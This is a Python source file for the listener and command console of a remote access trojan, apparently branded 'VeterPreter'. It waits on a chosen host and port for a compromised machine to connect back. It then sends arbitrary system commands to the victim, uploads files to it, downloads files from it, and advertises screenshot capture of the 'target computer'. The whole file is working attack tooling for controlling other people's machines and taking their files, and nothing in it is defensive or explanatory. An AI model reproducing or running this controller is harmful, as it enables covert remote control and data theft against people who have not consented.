import socket, json, base64, subprocess, time
from colorama import Fore

class Listener:
    def __init__(self):
        HOST = raw_input(Fore.WHITE + "Avyukt>: Please provide LHOST >> ")
        PORT = int(raw_input(Fore.WHITE + "Avyukt>: Please provide LPORT >> "))
        subprocess.call("clear", shell=True)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(((HOST, PORT)))
        IP = HOST
        P = PORT
        print("[+] Starting the Handler")
        time.sleep(5)
        print(Fore.LIGHTBLUE_EX + "\n[+] Listening For Connections on " + str(IP) + " : " + str(P))
        listener.listen(0)
        self.connection, address = listener.accept()
        print(Fore.BLUE + "\n[+] " + Fore.WHITE + "Starting interaction with " + str(address))
        time.sleep(5)
        print(Fore.BLUE + "\n[+] " + Fore.WHITE + "Session 1 Opened : Connection Established" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def help(self):
        print(Fore.RED + "\n[+] upload : Upload files to target computer")
        print(Fore.RED + "[+] download : Download files from target computer")
        print(Fore.RED + "[+] System Commands : Execute any system commands")
        print(Fore.RED + "[+] snapshot : Get a screenshot of the taret computer and it gets saved as Captured_SS.png")
        print(Fore.RED + "[+] exit : terminates all sessions")
        return ""

    def write(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successfull"

    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(Fore.WHITE + "\nVeterPreter >> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write(command[1], result)
                if command[0] == "help":

                    result = self.help()
            except Exception:
                result = "[-] Error during command execution"

            print(result)


my_listener = Listener()
my_listener.run()
